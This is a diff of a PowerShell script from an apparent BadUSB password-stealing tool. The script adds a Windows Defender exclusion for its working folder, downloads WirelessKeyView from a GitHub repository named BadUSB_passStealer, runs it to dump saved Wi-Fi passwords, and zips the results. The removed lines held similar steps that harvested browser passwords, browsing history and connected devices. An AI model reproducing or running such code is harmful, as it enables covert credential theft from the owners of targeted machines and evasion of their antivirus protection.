@@ -11,43 +11,38 @@ $dumpFile = "$dumpFolder.zip"
 
 # Create directory
 New-Item -ItemType Directory -Path $basePath -Force | Out-Null
-Set-Location $basePath
 New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
+
+# Exclude path from Defender (if necessary)
 Add-MpPreference -ExclusionPath $basePath -Force
 
-# Download necessary tools
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true -OutFile WirelessKeyView.exe
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/BrowsingHistoryView.exe?raw=true -OutFile BrowsingHistoryView.exe
-Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WNetWatcher.exe?raw=true -OutFile WNetWatcher.exe
+# Download WirelessKeyView
+$wifiTool = "$basePath\WirelessKeyView.exe"
+Invoke-WebRequest -Uri "https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WirelessKeyView.exe?raw=true" -OutFile $wifiTool
 
+# Run WirelessKeyView to extract Wi-Fi passwords
+$wifiFile = "$dumpFolder\wifi.txt"
+Start-Process -FilePath $wifiTool -ArgumentList "/stext $wifiFile" -NoNewWindow -Wait
 
-# Execute tools to gather data
-.\WNetWatcher.exe /stext connected_devices.txt
-.\BrowsingHistoryView.exe /VisitTimeFilterType 3 7 /stext history.txt
-.\WebBrowserPassView.exe /stext passwords.txt
-.\WirelessKeyView.exe /stext wifi.txt
-
-# Wait for the files to be fully written
-while (!(Test-Path "passwords.txt") -or !(Test-Path "wifi.txt") -or !(Test-Path "connected_devices.txt") -or !(Test-Path "history.txt")) {
+# Ensure Wi-Fi file is created
+while (!(Test-Path $wifiFile)) {
     Start-Sleep -Seconds 1
 }
-
-Move-Item passwords.txt, wifi.txt, connected_devices.txt, history.txt -Destination "$dumpFolder"
 
 # Compress extracted data
 Compress-Archive -Path "$dumpFolder\*" -DestinationPath "$dumpFile" -Force
 
-# Wait until the ZIP file is created
+# Ensure ZIP file is created
 while (!(Test-Path "$dumpFile")) {
     Start-Sleep -Seconds 1
 }
 
+# Flash the terminal 5 times
+for ($i = 1; $i -le 5; $i++) {
+    Write-Host "`e[5mFlashing Terminal...`e[25m"  # ANSI escape codes for blinking effect
+    Start-Sleep -Seconds 1
+}
 
-# Caps Lock signal
-$keyBoardObject = New-Object -ComObject WScript.Shell
-for ($i=0; $i -lt 4; $i++) {
-    $keyBoardObject.SendKeys("{CAPSLOCK}")
     Start-Sleep -Seconds 1
 }
 
